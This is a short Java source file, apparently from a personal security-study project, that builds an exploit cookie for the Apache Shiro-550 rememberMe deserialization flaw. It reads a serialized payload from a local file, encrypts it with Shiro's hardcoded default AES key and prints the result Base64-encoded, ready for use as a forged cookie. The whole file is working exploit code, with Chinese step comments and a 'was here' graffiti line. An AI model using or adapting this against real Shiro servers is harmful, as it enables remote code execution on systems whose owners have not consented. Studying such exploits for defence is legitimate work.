/*
 * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
 * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.
 * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.
 * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.
 * Vestibulum commodo. Ut rhoncus gravida arcu.
 */

package com.y5neko.sec.shiro;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.util.ByteSource;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class Shiro550_Exp {
    public static void main(String[] args) throws Exception{
        byte[] DEFAULT_CIPHER_KEY_BYTES = org.apache.shiro.codec.Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
        CipherService cipherService = new AesCipherService();


        //读取payload
        byte[] bytes = Files.readAllBytes(Paths.get("H:\\Java_Project\\Java_Security\\src\\com\\y5neko\\sec\\shiro\\shiro550"));
        //AES加密
        ByteSource byteSource = cipherService.encrypt(bytes, DEFAULT_CIPHER_KEY_BYTES);
        byte[] value = byteSource.getBytes();
        //Base64编码
        String base64 = Base64.getEncoder().encodeToString(value);
        System.out.println(base64);
    }
}
//lidy4x1到此一游
